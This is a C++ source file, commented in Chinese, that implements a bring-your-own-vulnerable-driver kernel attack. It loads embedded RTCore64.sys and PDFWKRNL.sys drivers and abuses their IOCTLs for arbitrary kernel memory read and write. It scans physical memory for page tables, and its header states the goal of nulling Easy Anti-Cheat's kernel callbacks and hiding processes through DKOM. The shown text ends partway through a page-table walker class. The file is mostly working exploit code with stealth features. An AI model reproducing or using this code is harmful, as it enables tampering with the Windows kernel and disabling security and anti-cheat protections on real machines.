// ============================================================
// byovd_kernel.cpp — BYOVD 内核级 EAC 防御完整实现
//
// 技术栈:
//   1. RTCore64.sys BYOVD 加载 (合法签名漏洞驱动)
//   2. 内核VA R/W: IOCTL 0x80002048/0x4C 直接读写任意内核虚拟地址 (v3.124: 唯一路径)
//   3. Sigscan ObRegisterCallbacks → 定位 ObpCallbackArrayHead
//   4. 遍历回调数组 → NULL EAC 的所有注册回调
//   5. DKOM EPROCESS 断链 (可选, 触发 PatchGuard)
//
// 注意: v3.124 使用 PhysicalReadViaIOCTL (0x80002048) 直接读写内核VA,
//   此 RTCore64 版本不支持 VirtualReadViaIOCTL (0x80002000, err=87)。
//   物理 IOCTL (0x80002048/0x4C) 实际功能是直接读写内核VA, 非 MmMapIoSpace。
// ============================================================

#include "byovd_kernel.h"
#include <winreg.h>
#include <winternl.h>
#include <winsvc.h>
#include <cstdio>
#include <cstring>
// ★ BUILD 501: 移除 <algorithm> <fstream> <random> <ctime> <cstdarg> — CRT 堆依赖
#include <Psapi.h>
#include <shlobj.h>
#include "syscall_direct.h"  // ★ BUILD 484: TartarusGate::GenerateSyscallStub for NtLoadDriver
#ifdef _MSC_VER
#include <intrin.h>
#endif

// ★ v3.37: BYOVD 本地诊断日志 (写 %TEMP%\stealth_diag.log)
static void ByovdDiag(const char* fmt, ...) {
    char buf[512];
    va_list args;
    va_start(args, fmt);
    int len = vsnprintf(buf, sizeof(buf), fmt, args);
    va_end(args);
    if (len < 0) return;
    wchar_t path[MAX_PATH];
    GetTempPathW(MAX_PATH, path);
    wcscat_s(path, L"stealth_diag.log");
    HANDLE h = CreateFileW(path, FILE_APPEND_DATA, FILE_SHARE_READ, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    if (h != INVALID_HANDLE_VALUE) {
        DWORD w;
        WriteFile(h, buf, (DWORD)len, &w, 0);
        FlushFileBuffers(h);  // ★ v3.38: 强制落盘
        CloseHandle(h);
    }
}

// BYOVD 驱动嵌入支持: 将 RTCore64.sys 编译进 payload
//   python scripts/embed_driver.py RTCore64.sys → rtcore64_embed.h
//   v3.47: 始终嵌入, 移除 #ifdef 编译开关 — 驱动从 TEMP 提取
#include "rtcore64_embed.h"
#include "pdfwkrnl_embed.h"   // ★ BUILD 489: PDFWKRNL.sys 替代驱动
#include <initializer_list>

#pragma comment(lib, "advapi32.lib")

// ★ v3.78: 全局引用 payload.cpp 中的 VEH 自愈备份缓冲区
//   由 MapPhysical 的主动恢复使用
extern uint8_t* g_backupBuf;
extern SIZE_T   g_backupLen;
extern uint8_t* g_backupCodeBase;
extern void*    g_vehHandlerPageVA;

namespace stealth {

// ============================================================
// ★ v3.69/v3.117: 受保护用户态区域全局变量 — 固定数组, 避免 std::vector CRT 堆依赖
// 注意: 单线程访问, 无需同步
// 注意: MAX_PROTECTED_REGIONS 已在 byovd_kernel.h 中定义, 此处不重复定义
// ============================================================
ProtectedUserRegion g_protectedUserRegions[MAX_PROTECTED_REGIONS] = {};
int g_protectedRegionCount = 0;

// ============================================================
// PML4 物理地址获取 — 通过 IOCTL 扫描物理内存
//
// ★ v3.84: mov cr3 是特权指令, 在用户态(Ring 3)执行会触发
//   STATUS_PRIVILEGED_INSTRUCTION (0xC0000096) → #GP(0)。
//   改为通过 RTCore64 IOCTL 直接映射物理内存,
//   扫描寻找当前进程的 PML4 表并缓存其物理地址。
//
//   原理: PML4 表是一个 4KB 页, 包含 512 个 uint64 表项。
//   内核半区 (entry 256-511) 在所有进程中共享相同的物理 PDPT 指向,
//   因此可通过验证内核 PML4E → PDPTE 链来确定 PML4 身份。
// ============================================================

// ★ ReadCR3 不能是 static — 需要在 byovd_kernel.h 中 friend 声明

// ★ v3.99: IOCTL 探测 — 逆向分析 RTCore64.sys 发现:
//   - IOCTL 基码: 0x80002000 (CTL_CODE(0x8000, 0x800, METHOD_BUFFERED, ANY))
//   - 驱动 dispatch 检查: (ioctl + 0x7FFFE000) <= 0x54 → 有效范围 0x80002000~0x80002054
//   - 子码步长: 4 (0x00, 0x04, 0x08, ... 0x54)
//   - 已知子码功能:
//       0x00: 虚拟内存读/写 (48字节输入)
//       0x08: I/O 端口读字节
//       0x0C: I/O 端口读字
//       0x10: I/O 端口读双字
//       0x14: I/O 端口写字节
//       0x18: PCI 配置空间访问 (24字节输入)
//       0x1C: I/O 端口写双字
//       0x20: 简单操作/获取版本 (8字节输入)
//       0x28: RDMSR (12字节输入)
//       0x2C: WRMSR (12字节输入)
//       0x30: 物理内存映射 (MmMapIoSpace, 48字节输入)
//       0x34: 物理内存映射变体 (48字节输入)
//       0x40-0x54: 复用 0x30-0x34 的 handler
// ★ v3.103: 安全 IOCTL 探测 — 0x80002048/0x8000204C 为物理内存 R/W 主候选
//   参考: CVE-2022-22077, deepwiki RTCore64 Analysis
//   BSOD教训: 0x80002040(PCI Bus) 导致 err=1450 (资源耗尽) → 蓝屏
//   v3.102 错误: 0xC3502580 是 MSR 操作, 不是物理内存映射
//   v3.101 错误: 0x80002030/0x34 返回 err=87 (参数不匹配)
//   修复: 0x80002048(Read PhysMem) + 0x8000204C(Write PhysMem) 是正确 IOCTL
//   输入结构: { uint64_t physAddr; uint32_t size; uint32_t reserved; } (12-16字节)
//   测试物理地址: 0x100000 (1MB), 避开 BIOS 数据区
// ★ v3.122: 仅保留安全 IOCTL 候选 — 移除 0x80002030/0x34 (导致 BSOD)
static const uint32_t g_ioctlCandidates[] = {
    0x80002048,  // ★ 主候选: 物理内存读取 (MmMapIoSpace, CVE-2022-22077)
    0x8000204C,  // ★ 主候选: 物理内存写入 (MmMapIoSpace, CVE-2022-22077)
};
static const int g_ioctlCandidateCount = sizeof(g_ioctlCandidates) / sizeof(g_ioctlCandidates[0]);

// ★ v3.101: 安全测试物理地址 — 1MB 处, 避开 BIOS 数据区 (0-1MB)
static const uint64_t SAFE_TEST_PHYS = 0x100000;

// ★ v3.99: 请求格式枚举 — 适配 0x80002000 系列 IOCTL
//   逆向分析: 驱动使用 METHOD_BUFFERED, SystemBuffer 传递参数
//   不同 sub-code 对应不同输入结构大小:
//     0x00: 48字节 (虚拟内存 R/W)
//     0x08-0x1C: 8字节 (I/O 端口)
//     0x18: 24字节 (PCI 配置空间)
//     0x20: 8字节 (简单操作)
//     0x28/0x2C: 12字节 (RDMSR/WRMSR)
//     0x30/0x34: 48字节 (物理内存映射)
enum class RTCore64Format {
    FMT_48B_PA_AT_00 = 0,  // 48字节: physAddr@+0x00, mappedVA@+0x08 (输出)
    FMT_48B_PA_AT_08,       // 48字节: physAddr@+0x08, mappedVA@+0x08 (输出)
    FMT_32B_RAW,            // 32字节: { uint64_t pa; uint32_t sz; uint32_t fl; } (旧格式兼容)
    FMT_8B_RAW,             // 8字节: 仅 uint64_t (I/O port 等)
    FMT_12B_RAW,            // 12字节: { uint32_t idx; uint32_t hi; uint32_t lo; } (MSR)
};

// ★ v3.100: 存储 IOCTL 探测结果 — 让 MapPhysical 使用正确的格式
static RTCore64Format g_probedIoctlFormat = RTCore64Format::FMT_32B_RAW;

// ★ v3.122: IOCTL 模式标志 — true=VirtualReadViaIOCTL (0x80002000), false=PhysicalReadViaIOCTL (0x80002048/0x4C)
//   虚拟内存 IOCTL 直接读写内核VA, 无需页表遍历; 物理内存 IOCTL 需要先 VA→PA 转换
//   默认 false (物理IOCTL模式), 探测成功时切换
static bool g_useVirtualIOCTL = false;

// ★ v3.114: 虚拟内存 R/W 用 IOCTL 0x80002000 (sub-code 0x00) — 此RTCore64版本不支持
//   物理内存 R/W 用 IOCTL 0x80002048/0x8000204C (sub-code 0x12/0x13)
// ★ v3.123: 实际测试证实 0x80002048 直接读写内核VA (非物理地址),
//   BUILD 407 (v3.109) 已验证此方案正常工作。
// ★ v3.120: 移至 VirtualReadViaIOCTL 之前 — 确保在第一次使用前定义
static const uint32_t IOCTL_VIRTUAL_MEM   = 0x80002000;   // 虚拟内存读/写 (不支持)
static const uint32_t IOCTL_PHYSICAL_READ  = 0x80002048; // 实际功能: 内核VA读取 (非MmMapIoSpace)
static const uint32_t IOCTL_PHYSICAL_WRITE = 0x8000204C; // 实际功能: 内核VA写入

// ★ BUILD 489: PDFWKRNL.sys IOCTL — AMD PDF Worker 内核VA memcpy
//   CTL_CODE(FILE_DEVICE_AMD_PDFW, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)
//   = (0x8000 << 16) | (0x805 << 2) | 0 | 0 = 0x80002014
static const uint32_t IOCTL_AMDPDFW_MEMCPY = 0x80002014;

// ★ BUILD 489: PDFW_MEMCPY 结构体 — IOCTL 0x80002014 的输入/输出缓冲区
//   驱动内部: memcpy(Destination, Source, Size) — 内核态无安全检查
#pragma pack(push, 1)
struct PDFW_MEMCPY_REQUEST {
    uint8_t  Reserved[16];    // +0x00: 未使用
    void*    Destination;     // +0x10: 目标地址 (写到哪里)
    void*    Source;          // +0x18: 源地址 (从哪里读)
    void*    Reserved2;       // +0x20: 未使用
    uint32_t Size;            // +0x28: 拷贝字节数
    uint32_t Reserved3;       // +0x2C: 未使用
};  // sizeof = 0x30
#pragma pack(pop)

// ★ v3.104: 存储探测到的 IOCTL 码 (读/写分开)
static uint32_t g_probedReadIoctl  = 0;
static uint32_t g_probedWriteIoctl = 0;

// ★ BUILD 489: 驱动类型 — 区分 RTCore64 和 PDFWKRNL 的 IOCTL 路径
static bool g_isPdfwKrnl = false;

// ★ v3.115: 虚拟内存读取 — 使用 IOCTL 0x80002000 (sub-code 0x00)
// ★ v3.123: 修正输入格式 — 大多数 RTCore64 利用代码使用 address 在 +0x00 的格式:
//     +0x00: uint64_t kernel virtual address
//     +0x08: uint32_t size (1, 2, 或 4 字节)
//     +0x0C: uint32_t pad (设为 0)
//     +0x10: uint64_t value (输出: 读取的值)
//     +0x18: pad[28] (未使用)
//   旧格式 (v3.115-v3.122): size@+0x00, addr@+0x08 — 导致 err=87 (ERROR_INVALID_PARAMETER)
//   注意: 驱动不支持 QWORD 单次读取; 64位值通过两次 DWORD 读取完成
static bool VirtualReadViaIOCTL(HANDLE hDevice, uint64_t kernelVA, void* outBuf, size_t size) {
    if (hDevice == INVALID_HANDLE_VALUE) return false;

    size_t bytesRead = 0;

    for (size_t off = 0; off < size; ) {
        // 每次读取最多 4 bytes (DWORD) — 驱动不支持 QWORD 单次读取
        size_t chunk = (size - off > 4) ? 4 : (size - off);
        uint32_t readSize = (chunk <= 1) ? 1 : (chunk <= 2) ? 2 : 4;

        // 构造 IOCTL 输入 (48字节, 虚拟内存格式)
        //   +0x00: kernel virtual address
        //   +0x08: size (驱动读取此字段决定读取字节数)
        //   +0x10: output value (驱动写入读取结果)
        uint8_t buf[48] = {};
        *(uint64_t*)(buf + 0x00) = kernelVA + off;
        *(uint32_t*)(buf + 0x08) = readSize;

        DWORD bytesRet = 0;
        BOOL ok = DeviceIoControl(hDevice, IOCTL_VIRTUAL_MEM,
                                  buf, sizeof(buf),
                                  buf, sizeof(buf),
                                  &bytesRet, nullptr);
        if (!ok) {
            ByovdDiag("BYOVD:VirtualRead: va=0x%llX off=%zu FAILED err=%u\n",
                      (unsigned long long)kernelVA, off, GetLastError());
            return false;
        }

        // 读取结果在 +0x10 (uint64_t)
        uint64_t readVal = *(uint64_t*)(buf + 0x10);
        memcpy((uint8_t*)outBuf + off, &readVal, (readSize < chunk) ? readSize : (uint32_t)chunk);
        off += chunk;
        bytesRead += chunk;
    }
    return bytesRead > 0;
}

// ★ v3.115: 虚拟内存写入 — 使用 IOCTL 0x80002000 (sub-code 0x00)
// ★ v3.123: 修正输入格式 — 与 VirtualReadViaIOCTL 保持一致:
//     +0x00: uint64_t kernel virtual address
//     +0x08: uint32_t size (1, 2, 或 4 字节)
//     +0x0C: uint32_t pad (设为 0)
//     +0x10: uint64_t value (输入: 要写入的值)
//     +0x18: pad[28] (未使用)
static bool VirtualWriteViaIOCTL(HANDLE hDevice, uint64_t kernelVA, const void* inBuf, size_t size) {
    if (hDevice == INVALID_HANDLE_VALUE) return false;

    for (size_t off = 0; off < size; ) {
        // 每次写入最多 4 bytes (DWORD)
        size_t chunk = (size - off > 4) ? 4 : (size - off);
        uint32_t writeSize = (chunk <= 1) ? 1 : (chunk <= 2) ? 2 : 4;

        // 读取要写入的值 (最多 4 bytes)
        uint64_t writeVal = 0;
        memcpy(&writeVal, (const uint8_t*)inBuf + off, chunk);

        // 构造 IOCTL 输入 (48字节, 虚拟内存格式)
        uint8_t buf[48] = {};
        *(uint64_t*)(buf + 0x00) = kernelVA + off;
        *(uint32_t*)(buf + 0x08) = writeSize;
        *(uint64_t*)(buf + 0x10) = writeVal;

        DWORD bytesRet = 0;
        BOOL ok = DeviceIoControl(hDevice, IOCTL_VIRTUAL_MEM,
                                  buf, sizeof(buf),
                                  buf, sizeof(buf),
                                  &bytesRet, nullptr);
        if (!ok) {
            ByovdDiag("BYOVD:VirtualWrite: va=0x%llX off=%zu FAILED err=%u\n",
                      (unsigned long long)kernelVA, off, GetLastError());
        }
        off += chunk;
    }
    return true;
}

// ★ v3.115: 物理内存读取 — 使用 IOCTL 0x80002048 (sub-code 0x12)
//   IOCTL struct (48 bytes): pad0[8] + addr[8] + pad1[8] + sizeType[4] + value[4] + pad2[16]
//   sizeType: 1=BYTE, 2=WORD, 4=DWORD (参考: grisuno/CVE-2022-22077 exploit.c)
//   注意: 驱动不支持 QWORD 单次读取; 64位值通过两次 DWORD 读取完成
//   参考: https://github.com/grisuno/CVE-2022-22077
static bool PhysicalReadViaIOCTL(HANDLE hDevice, uint32_t ioctlCode,
                                  uint64_t physAddr, void* outBuf, size_t size) {
    if (hDevice == INVALID_HANDLE_VALUE || !ioctlCode) return false;

    size_t bytesRead = 0;

    for (size_t off = 0; off < size; ) {
        size_t chunk = (size - off > 4) ? 4 : (size - off);
        uint32_t sizeType = (chunk <= 1) ? 1 : (chunk <= 2) ? 2 : 4;

        // 构造 IOCTL 输入 (48字节, 物理内存格式)
        //   +0x00: pad0[8] (unused)
        //   +0x08: physical address
        //   +0x18: sizeType (1=BYTE, 2=WORD, 4=DWORD)
        //   +0x1C: value (output)
        uint8_t buf[48] = {};
        *(uint64_t*)(buf + 0x08) = physAddr + off;
        *(uint32_t*)(buf + 0x18) = sizeType;

        DWORD bytesRet = 0;
        BOOL ok = DeviceIoControl(hDevice, ioctlCode,
                                  buf, sizeof(buf),
                                  buf, sizeof(buf),
                                  &bytesRet, nullptr);
        if (!ok) {
            ByovdDiag("BYOVD:PhysRead: ioctl=0x%08X phys=0x%llX FAILED err=%u\n",
                      ioctlCode, (unsigned long long)(physAddr + off), GetLastError());
            return false;
        }

        // 读取结果在 offset +0x1C (value 字段, 总是 DWORD)
        uint32_t readVal = *(uint32_t*)(buf + 0x1C);
        uint32_t validBytes = (sizeType == 1) ? 1 : (sizeType == 2) ? 2 : 4;
        memcpy((uint8_t*)outBuf + off, &readVal, (validBytes < chunk) ? validBytes : (uint32_t)chunk);
        off += chunk;
        bytesRead += chunk;
    }
    return bytesRead > 0;
}

// ★ v3.115: 物理内存写入 — 使用 IOCTL 0x8000204C (sub-code 0x13)
//   IOCTL struct (48 bytes): pad0[8] + addr[8] + pad1[8] + sizeType[4] + value[4] + pad2[16]
//   sizeType: 1=BYTE, 2=WORD, 4=DWORD (参考: grisuno/CVE-2022-22077 exploit.c)
//   注意: 驱动不支持 QWORD 单次写入; 64位值通过两次 DWORD 写入完成
static bool PhysicalWriteViaIOCTL(HANDLE hDevice, uint32_t ioctlCode,
                                   uint64_t physAddr, const void* inBuf, size_t size) {
    if (hDevice == INVALID_HANDLE_VALUE || !ioctlCode) return false;

    // ★ v3.126q: 修复 C3 — 不再静默失败
    //   之前无条件 return true, 即使所有 DeviceIoControl 都失败
    //   这导致 EAC 回调"摘除"但实际上写入完全失败
    size_t written = 0; // 成功写入的字节数

    for (size_t off = 0; off < size; ) {
        size_t chunk = (size - off > 4) ? 4 : (size - off);
        uint32_t sizeType = (chunk <= 1) ? 1 : (chunk <= 2) ? 2 : 4;

        uint32_t writeVal = 0;
        memcpy(&writeVal, (const uint8_t*)inBuf + off, chunk);

        // 构造 IOCTL 输入 (48字节, 物理内存格式)
        uint8_t buf[48] = {};
        *(uint64_t*)(buf + 0x08) = physAddr + off;
        *(uint32_t*)(buf + 0x18) = sizeType;
        *(uint32_t*)(buf + 0x1C) = writeVal;

        DWORD bytesRet = 0;
        BOOL ok = DeviceIoControl(hDevice, ioctlCode,
                                  buf, sizeof(buf),
                                  buf, sizeof(buf),
                                  &bytesRet, nullptr);
        if (!ok) {
            ByovdDiag("BYOVD:PhysWrite: ioctl=0x%08X phys=0x%llX FAILED err=%u\n",
                      ioctlCode, (unsigned long long)(physAddr + off), GetLastError());
        } else {
            written += chunk;
        }
        off += chunk;
    }
    return (written == size);
}

// 尝试一种 IOCTL 码 + 格式组合 (用于探测)
// ★ v3.104: 改为检测数据返回而非 VA 映射 — 验证返回数据是否合理
static bool TryMapPhysical(HANDLE hDevice, uint32_t ioctlCode, uint64_t physAddr,
                           RTCore64Format fmt, uint8_t** outVirtAddr, DWORD* outErr) {
    uint8_t inBuf[64] = {};
    DWORD inSize = 0;
    // ★ v3.99: output buffer 增大到 512 字节, 某些格式需要更大的输出空间
    union { uint8_t raw[512]; uint8_t* mappedPtr; } outBuf;
    outBuf.mappedPtr = nullptr;
    DWORD bytesRet = 0;

    switch (fmt) {
        case RTCore64Format::FMT_48B_PA_AT_00: {
            // 48字节: physAddr@+0x00, mappedVA@+0x08 (输出)
            // 驱动内部: ZwOpenSection(\Device\PhysicalMemory) + ZwMapViewOfSection
            struct { uint64_t pa; uint64_t mappedVA; uint8_t pad[32]; } req;
            memset(&req, 0, sizeof(req));
            req.pa = physAddr;
            memcpy(inBuf, &req, sizeof(req));
            inSize = sizeof(req);
            break;
        }
        case RTCore64Format::FMT_48B_PA_AT_08: {
            // 48字节: physAddr@+0x08, mappedVA@+0x08 (输出)
            // 驱动内部: MmMapIoSpace(physAddr, ...)
            struct { uint64_t unk0; uint64_t pa; uint32_t sz; uint8_t pad[28]; } req;
            memset(&req, 0, sizeof(req));
            req.unk0 = 0;
            req.pa = physAddr;
            req.sz = 0x1000;
            memcpy(inBuf, &req, sizeof(req));
            inSize = sizeof(req);
            break;
        }
        case RTCore64Format::FMT_32B_RAW: {
            // 旧格式: { uint64_t pa; uint32_t sz; uint32_t fl; }
            struct { uint64_t pa; uint32_t sz; uint32_t fl; } req;
            req.pa = physAddr;
            req.sz = 0x1000;
            req.fl = 0;
            memcpy(inBuf, &req, sizeof(req));
            inSize = sizeof(req);
            break;
        }
        case RTCore64Format::FMT_8B_RAW: {
            // 8字节: 仅 uint64_t
            memcpy(inBuf, &physAddr, sizeof(physAddr));
            inSize = sizeof(physAddr);
            break;
        }
        case RTCore64Format::FMT_12B_RAW: {
            // 12字节: { uint32_t idx; uint32_t hi; uint32_t lo; }
            struct { uint32_t idx; uint32_t hi; uint32_t lo; } req;
            req.idx = (uint32_t)physAddr;
            req.hi = 0;
            req.lo = 0;
            memcpy(inBuf, &req, sizeof(req));
            inSize = sizeof(req);
            break;
        }
    }

    BOOL ok = DeviceIoControl(hDevice, ioctlCode,
                              inBuf, inSize,
                              outBuf.raw, sizeof(outBuf.raw),
                              &bytesRet, nullptr);
    DWORD err = GetLastError();
    if (outErr) *outErr = err;

    // ★ v3.99: 对于 0x80002030/0x34, 映射结果在 SystemBuffer[0x08] 处
    //   DeviceIoControl 会将 SystemBuffer 复制回 output buffer
    //   mappedVA 就在 outBuf 的前 8 字节 (或偏移 8 字节处)
    if (ok) {
        // 尝试从 output buffer 的不同偏移读取映射地址
        uint64_t candidateVA = 0;
        memcpy(&candidateVA, outBuf.raw, 8);
        if (candidateVA && candidateVA > 0x10000) {
            // 格式 FMT_48B_PA_AT_00: mappedVA 在 output[0x00]
            *outVirtAddr = (uint8_t*)(uintptr_t)candidateVA;
            return true;
        }
        memcpy(&candidateVA, outBuf.raw + 8, 8);
        if (candidateVA && candidateVA > 0x10000) {
            // 格式 FMT_48B_PA_AT_08: mappedVA 在 output[0x08]
            *outVirtAddr = (uint8_t*)(uintptr_t)candidateVA;
            return true;
        }
        // 如果 ok 但 mappedVA 为空, 可能驱动返回了成功但用了不同的输出格式
        // 尝试直接使用 output buffer 指针
        if (outBuf.mappedPtr) {
            *outVirtAddr = outBuf.mappedPtr;
            return true;
        }
    }
    return false;
}

// ★ v3.115: 安全 IOCTL 探测 — 使用 PhysicalReadViaIOCTL 验证物理内存读取
//   探测 IOCTL 0x80002048/0x4C/0x30/0x34 哪个能成功读取物理内存
//   - 每次探测间 Sleep(50ms) 防止资源耗尽
//   - 最多 8 次探测, 立即 abort 资源耗尽 (err=1450)
// ★ v3.113: 改用 SAFE_TEST_PHYS (0x100000) 代替 0xFFFFF800... 虚拟地址
//   驱动 IOCTL 期望物理地址, 传入非法物理地址导致 MmMapIoSpace 蓝屏
static uint32_t ProbeIoctlCode(HANDLE hDevice, uint8_t** outTestVA) {
    int totalProbes = 0;
    const int MAX_PROBES = 8;
    (void)outTestVA; // 未使用, 保留兼容

    uint8_t testBuf[0x1000] = {};

    for (int ci = 0; ci < g_ioctlCandidateCount && totalProbes < MAX_PROBES; ci++) {
        uint32_t ioctl = g_ioctlCandidates[ci];
        if (ioctl == 0x80002040 || ioctl == 0x80002044 || ioctl == 0x80002050 || ioctl == 0x80002054) {
            continue;
        }

        totalProbes++;

        // ★ v3.115: 使用 PhysicalReadViaIOCTL 验证物理内存读取
        memset(testBuf, 0, sizeof(testBuf));
        bool ok = PhysicalReadViaIOCTL(hDevice, ioctl, SAFE_TEST_PHYS, testBuf, 4);
        DWORD err = GetLastError();
        uint32_t readVal = *(uint32_t*)testBuf;

        ByovdDiag("BYOVD:ProbeIOCTL: ioctl=0x%08X ok=%d err=%u phys=0x%llX val=0x%08X probe=%d/%d\n",
                  ioctl, (int)ok, err, (unsigned long long)SAFE_TEST_PHYS, readVal, totalProbes, MAX_PROBES);

        if (ok && readVal != 0 && readVal != 0xFFFFFFFF) {
            g_probedReadIoctl = ioctl;
            g_probedWriteIoctl = ioctl + 4;
            // ★ v3.122: 同步更新 g_probedIoctlFormat — PhysicalReadViaIOCTL 使用 48 字节格式
            //   (addr@+0x08, sizeType@+0x18), 对应 FMT_48B_PA_AT_08
            g_probedIoctlFormat = RTCore64Format::FMT_48B_PA_AT_08;
            ByovdDiag("BYOVD:ProbeIOCTL: STORED readIoctl=0x%08X writeIoctl=0x%08X fmt=%d (val=0x%08X)\n",
                      g_probedReadIoctl, g_probedWriteIoctl, (int)g_probedIoctlFormat, readVal);
            return ioctl;
        }

        // 立即 abort 资源耗尽
        if (err == 1450) {
            ByovdDiag("BYOVD:ProbeIOCTL: ERROR_NO_SYSTEM_RESOURCES, aborting\n");
            break;
        }

        Sleep(50);
    }
    return 0; // 全部失败
}

// 轻量物理读取: 直接 IOCTL, 无日志/缓存/overlap 检查
// ★ v3.115: 使用 PhysicalReadViaIOCTL 读取物理内存, 不再错误使用虚拟内存 IOCTL
static bool MapPhysicalRaw(HANDLE hDevice, uint32_t ioctlCode,
                           uint64_t physAddr, uint8_t* outBuf4K) {
    if (!outBuf4K) return false;
    // ★ v3.115: 使用物理内存 IOCTL (0x80002048) 读取物理地址
    return PhysicalReadViaIOCTL(hDevice, ioctlCode, physAddr, outBuf4K, 0x1000);
}

// 检查一个物理页是否为当前进程的 PML4 表
static bool IsValidPML4(HANDLE hDevice, uint32_t ioctlCode,
                        uint64_t physAddr, uint64_t* pml4Entries) {
    // ★ v3.104: 直接读取物理页到 pml4Entries 缓冲区
    if (!MapPhysicalRaw(hDevice, ioctlCode, physAddr, (uint8_t*)pml4Entries))
        return false;

    uint64_t* entries = pml4Entries;

    // 验证: 内核半区 (entry 256-511) 需要大部分 Present
    int kernelPresent = 0;
    for (int i = 256; i < 512; i++) {
        if (entries[i] & 1) kernelPresent++;
    }
    if (kernelPresent < 200) return false; // 至少 200 个内核条目

    // 验证: 抽查一个内核 PDPT — entry 0x1F0~0x1FF 是高内核地址区域
    for (int i = 490; i < 512; i++) {
        if (!(entries[i] & 1)) continue;
        uint64_t pdptPhys = entries[i] & 0x0000FFFFFFFFF000ULL;

        // ★ v3.122: 验证 pdptPhys 有效性 — 防止无效地址导致 MmMapIoSpace BSOD
        //   PML4E 的 Present 位为 1 不代表物理地址一定有效,
        //   过滤掉 0x0、BIOS 区域 (<0x1000)、以及过高的地址 (>4GB)
        if (pdptPhys == 0 || pdptPhys < 0x1000 || pdptPhys >= 0x100000000ULL)
            continue;

        uint8_t pdptBuf[0x1000];
        if (!MapPhysicalRaw(hDevice, ioctlCode, pdptPhys, pdptBuf))
            continue;

        // 读取 PDPT, 检查其内核半区是否也有 Present 条目
        uint64_t* pdptEntries = (uint64_t*)pdptBuf;

        int pdptKernel = 0;
        for (int j = 256; j < 512; j++) {
            if (pdptEntries[j] & 1) pdptKernel++;
        }
        if (pdptKernel > 100) return true; // 有效 PDPT → 确认为 PML4
    }
    return false;
}

// 通过 IOCTL 扫描物理内存寻找 PML4 表物理地址
static uint64_t FindPML4Physical(HANDLE hDevice, uint32_t ioctlCode) {
    // ★ v3.85: 先验证 IOCTL 是否真的可用 (避免在僵尸驱动上白扫描)
    {
        uint8_t testBuf[0x1000];
        bool testOk = MapPhysicalRaw(hDevice, ioctlCode, SAFE_TEST_PHYS, testBuf);
        ByovdDiag("BYOVD:FindPML4: IOCTL test phys=0x%llX ok=%d\n",
                  (unsigned long long)SAFE_TEST_PHYS, (int)testOk);
        if (!testOk) {
            ByovdDiag("BYOVD:FindPML4: IOCTL FAILED — driver zombie?\n");
            return 0; // IOCTL 不可用, 无需扫描
        }
    }

    // PML4 通常在低物理地址 (非分页池)
    // ★ v3.101: 从 1MB 开始扫描, 避开 0-1MB 的 BIOS 危险区域
    uint64_t pml4Entries[512]; // 栈上缓冲区
    const uint64_t SCAN_START  = SAFE_TEST_PHYS; // 1MB
    const uint64_t SCAN_LIMIT  = 0x8000000;       // 128 MB

    for (uint64_t phys = SCAN_START; phys < SCAN_LIMIT; phys += 0x1000) {
        // 每 4MB (1024 页) 输出进度
        if ((phys & 0x3FFFFF) == 0) {
            ByovdDiag("BYOVD:FindPML4: scanning @ phys=0x%llX / 0x%llX...\n",
                      (unsigned long long)phys, (unsigned long long)SCAN_LIMIT);
        }

        if (IsValidPML4(hDevice, ioctlCode, phys, pml4Entries)) {
            ByovdDiag("BYOVD:FindPML4: FOUND at phys=0x%llX (scanned %llu pages)\n",
                      (unsigned long long)phys, (unsigned long long)(phys >> 12));
            return phys;
        }
    }

    ByovdDiag("BYOVD:FindPML4: NOT FOUND in 128MB scan range\n");
    return 0;
}

// 获取 PML4 物理地址 (懒初始化 + 缓存)
// ★ 不能是 static: byovd_kernel.h 需要 friend 声明
// ★ v3.115: 使用 IOCTL_PHYSICAL_READ (0x80002048) 扫描物理内存, 不再使用虚拟内存 IOCTL
uint64_t ReadCR3() {
    static uint64_t s_cachedPML4 = 0;
    if (s_cachedPML4) return s_cachedPML4;

    auto& kma = KernelMemoryAccessor::Instance();
    // 注意: 此时 m_active=true, m_hDevice 有效 (Initialize 中调用)

    // ★ v3.115: 使用 IOCTL_PHYSICAL_READ (0x80002048) 扫描物理内存寻找 PML4
    s_cachedPML4 = FindPML4Physical(kma.m_hDevice, IOCTL_PHYSICAL_READ);

    ByovdDiag("BYOVD:ReadCR3: PML4 phys=0x%llX\n",
              (unsigned long long)s_cachedPML4);
    return s_cachedPML4;
}

// ============================================================
// 页表遍历: 虚拟地址 → 物理地址
//
// x64 分页结构:
//   [47:39] PML4 索引 (9 bits)    → PML4E
//   [38:30] PDPT 索引 (9 bits)    → PDPTE
//   [29:21] PD   索引 (9 bits)    → PDE
//   [20:12] PT   索引 (9 bits)    → PTE  (4KB 页; 2MB 大页跳过此层)
//   [11:0]  页内偏移  (12 bits)   → 最终地址
//
// 使用 __readcr3() 获取当前进程 CR3, 
// 内核空间页表跨所有进程共享, 因此可翻译任意内核地址
// ============================================================
class PageTableWalker {
public:
    PageTableWalker(uint64_t cr3, KernelMemoryAccessor& kma)
        : m_cr3(cr3 & ~0xFFF), m_kma(kma) {}

    // 将内核虚拟地址转换为物理地址
    // 返回 0 表示页不存在或转换失败
    uint64_t VaToPa(uint64_t va) {
        uint64_t pml4_idx = (va >> 39) & 0x1FF;
        uint64_t pdpt_idx = (va >> 30) & 0x1FF;
        uint64_t pd_idx   = (va >> 21) & 0x1FF;
        uint64_t pt_idx   = (va >> 12) & 0x1FF;
        uint64_t offset   = va & 0xFFF;

        // Level 1: PML4
        uint64_t pml4e = ReadPhysQword(m_cr3 + pml4_idx * 8);
        if (!(pml4e & 1)) return 0;                    // Present
        uint64_t pdpt_pa = PFN_TO_PA(pml4e);

        // Level 2: PDPT
        uint64_t pdpte = ReadPhysQword(pdpt_pa + pdpt_idx * 8);
        if (!(pdpte & 1)) return 0;
        uint64_t pd_pa = PFN_TO_PA(pdpte);

        // Level 3: Page Directory
        uint64_t pde = ReadPhysQword(pd_pa + pd_idx * 8);
        if (!(pde & 1)) return 0;

        // 检查 2MB 大页 (PS bit = bit 7)
        if (pde & (1ULL << 7)) {
            return PFN_TO_PA_LARGE(pde) + (va & ((1ULL << 21) - 1));
        }

        // Level 4: Page Table
        uint64_t pte = ReadPhysQword(PFN_TO_PA(pde) + pt_idx * 8);
        if (!(pte & 1)) return 0;

        return PFN_TO_PA(pte) + offset;
    }

private:
    // PFN → 物理地址 (清除低12位标志 + NX位)
    static uint64_t PFN_TO_PA(uint64_t entry) {
        return (entry & 0x0000FFFFFFFFF000ULL) & ~(1ULL << 63);  // 清除 NX
    }

